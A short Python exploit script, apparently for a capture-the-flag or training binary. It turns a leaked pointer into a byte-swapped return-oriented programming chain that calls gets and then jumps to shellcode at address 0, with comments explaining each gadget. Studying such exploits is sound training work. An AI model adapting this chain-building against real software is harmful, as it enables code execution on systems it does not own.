ptrleak = int(input("Enter pointer leak: "), 16)

#Chain described bit by bit:
#FFs: Padding
#{0}: First calculated address. This jumps to a gadget that takes the next
#Byte and writes it to r15 (with sign extension). The 0s following are the input
#For that gadget.
#{1}: Second calculated address, gets. r15 (output) is set in our last gadget
#to 0, and r14 (size) is non-zero from regular program flow.
#0000: Jump to 0 (our shellcode).
ropchain = "FFFFFFFFFFFFFFFF{0}0000{1}0000"
baseaddr = ptrleak - 0x36a
numaddr1 = baseaddr + 0x56c #r15 write
numaddr2 = baseaddr + 0x574 #gets
addr1 = format(numaddr1, '04x')
addr1 = addr1[2:4] + addr1[0:2] #byte swap
addr2 = format(numaddr2, '04x')
addr2 = addr2[2:4] + addr2[0:2] #byte swap
print(ropchain.format(addr1, addr2))
